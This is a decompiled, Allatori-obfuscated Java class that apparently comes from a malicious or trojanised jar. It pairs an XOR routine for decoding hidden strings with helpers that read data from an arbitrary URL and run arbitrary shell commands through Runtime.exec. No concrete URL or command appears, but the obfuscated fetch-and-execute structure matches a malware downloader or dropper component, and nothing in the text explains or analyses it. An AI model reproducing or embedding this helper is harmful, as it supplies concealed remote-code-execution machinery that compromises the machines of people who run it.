import java.net.URL;
import java.io.InputStream;

// 
// Decompiled by Procyon v0.5.30
// 

public class y
{
    public static String E(final String a) {
        final int n = 5 << 3;
        final int n2 = 5 << 4 ^ 0x5;
        final int length = a.length();
        final char[] array = new char[length];
        int n3;
        int i = n3 = length - 1;
        final char[] array2 = array;
        final char c = (char)n2;
        final int n4 = n;
        while (i >= 0) {
            final char[] array3 = array2;
            final int n5 = n3;
            final char char1 = a.charAt(n5);
            --n3;
            array3[n5] = (char)(char1 ^ n4);
            if (n3 < 0) {
                break;
            }
            final char[] array4 = array2;
            final int n6 = n3;
            final char c2 = (char)(a.charAt(n6) ^ c);
            --n3;
            array4[n6] = c2;
            i = n3;
        }
        return new String(array2);
    }
    
    public static void b(final String a) throws Exception {
        ALLATORI_DEMO().exec(a).waitFor();
    }
    
    public static InputStream ALLATORI_DEMO(final String a) throws Exception {
        final URL url = new URL(a);
        URL url2;
        try {
            url.openConnection();
            url2 = url;
        }
        catch (Exception ex) {
            url2 = url;
        }
        return url2.openStream();
    }
    
    public static Runtime ALLATORI_DEMO() {
        return Runtime.getRuntime();
    }
}
